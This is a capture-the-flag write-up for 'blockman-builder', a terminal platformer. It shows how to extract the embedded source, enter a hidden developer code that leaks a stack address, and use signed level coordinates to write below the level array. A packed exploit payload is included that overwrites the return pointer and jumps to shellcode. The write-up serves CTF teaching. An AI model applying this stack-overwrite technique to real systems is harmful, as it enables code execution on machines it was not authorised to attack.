## `blockman-builder` -- a "Mario Maker" inspired 2D side-scrolling platformer game implimented with ncurses for play in a terminal

The binary isn't stripped and it was compiled with debug symbols. The source code was also embedded in a section named `bmb.c`. This is obvious if `strings` is run on the binary.

You can extract the source code with:

`objcopy --dump-section bmb.c=bmb.c bmb`

The main menu has a hidden "konami-style" secret code which can be found by examining source: **up up down down left right left right enter**. When entered, the code enables "DEVELOPER MODE" which makes the player invincible when playing, and provides a more detailed breakdown of level information in the level editor. Critically, developer mode "leaks" the address of the level data on the stack.

Levels are encoded in base64 and zlib. Once decoded, the level format consists ascii text. The provided `unpack_level.py` shows this:

    $ cat level.txt | ./unpack_level.py | head -n 20
    clear
    128
    12
    1,30,30
    4,8,25
    5,8,20
    5,29,17
    5,50,20
    6,35,18
    5,0,1
    5,3,0
    5,2,1
    7,30,21
    2,69,22
    7,48,28
    56
    6,80,10
    6,90,10
    6,100,10
    6,110,10


The first line is the level mode which can be either `clear` or `patch`. The only difference is that clear first zeros out the level array. `patch` makes selectively writing to memory possible and gives players more flexibility if they need it.

The second line `128` is the width of the level (min 64, max 512).
Line 3 `12` is the number of entities in the level. The next 12 lines are `entity id,x,y`.
Line 16 `56` is the number of block insertions instructions. The next 56 lines place elements into the level. There are two different formats. The 3-number format is `block id,x,y`. The 6-number format sets a rectangle of blocks from one corner of the rectangle to the other in the form `block id,x1,y1,x2,y2`.

The block editing format parses the coordinates as signed integers which allows underflowing the level array:

```C
        uint8_t id = 0;
        int64_t x1 = 0;
        int64_t y1 = 0;
        int64_t x2 = 0;
        int64_t y2 = 0;
        int fields = sscanf(line, "%hhd,%ld,%ld,%ld,%ld", (uint8_t *)&id, (int64_t *)&x1, (int64_t *)&y1, (int64_t *)&x2, (int64_t *)&y2);
        if (fields == 3) {
            if (x1 < level_width && y1 < WORLD_H) {
                world[(uint64_t)y1][(uint64_t)x1] = (uint8_t)id;
            }
```

My exploit writes shellcode to the level and then uses negative coordinates to overwrite the level editing return pointer to point to the level data (see provided `build_exploit_level.py`):

    $ ./build_exploit_level.py print_flag.bin 0x7ffd3de47d70 | ./pack_level.py
    eNo1kktyRSEIROd3LbwqQUBdTiqTDDPI/isN7R01oh6+v19/3z9PqD3jOeexGTJkPBmikBNikGUyIX7EIeYpQW/Su8qrQzZUt8ups2iBhqhSjFIgBb1IkAvSIulcosXSc0T3vSmY2hErnM0UI9AKqGKTJ6dcnjXPcV28gKNw9blxO2Uyu6lNmcxuEjb9FlLdqHNSFmVTDivx0ZV4g46KMy8nypmXE+TJ9Hzdcr1bdlz83JAx+nuwyGBeQVg4Q0Z0yLi0WBxDFMxwGS8se5ZDkrQkLUnLS0vSMru/GOq6LcqXl+caa7xGAVHF6mKHy+q5YtarqQNLEW3Ak/dtcTHZ1TVj4qvTHCZ78MXW10Hsll3YgxtSp+yioo07L2R3tliO/WL36fJONxJr98nmK3bjkx3TsA0w6wM6A6sXGE2G2VxsDUzODIa/RmXzD0lZjkQ=

Exploit steps:

1) Find the relative difference between the RIP in `load_level_from_text(char *text)` and the world address using GDB. This relative offset is consistent from run to run and can be done locally.
2) Connect to running server and enter developer code on the main menu
3) Enter editor to fetch world address
4) Build exploit level with the address
5) Import the exploit level

